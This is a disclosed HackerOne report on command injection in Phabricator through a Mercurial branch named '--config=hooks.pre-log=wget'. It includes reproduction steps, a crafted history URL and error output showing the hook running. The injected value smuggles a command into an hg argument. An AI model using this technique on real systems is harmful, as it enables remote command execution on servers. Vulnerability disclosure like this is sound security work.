# Command injection on Phabricator instance with an evil hg branch name

## Report Details
- **Report ID**: 288704
- **URL**: https://hackerone.com/reports/288704
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-11-09T08:57:35.077Z
- **Disclosed**: 2017-11-11T00:42:44.118Z

## Reporter
- **Username**: pnig0s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phabricator

## Vulnerability Information
Hi phabricator,

I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.

Here is the reproduction steps:
1. Monitor a remote mercurial repo with phabricator;
2. Create a branch and called "--config=hooks.pre-log=wget" on the remote;
3. After phabricator update the remote repo,visit the history page of that crafted branch;
```
http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/
```
4. It will raise an error like below and the wget command will be executed;
5. I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).

```
Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-
connect' log --debug --template '{node};{parents}\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev 
'reverse(ancestors('\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\''))' STDOUT running hook pre-log: 
wget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file 
/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... 
[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1
```
The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.
Thanks!

## Attachments
- evil_hg_branch_name_command_injection.png
- evil_hg_branch_name_command_injection_cloud.png
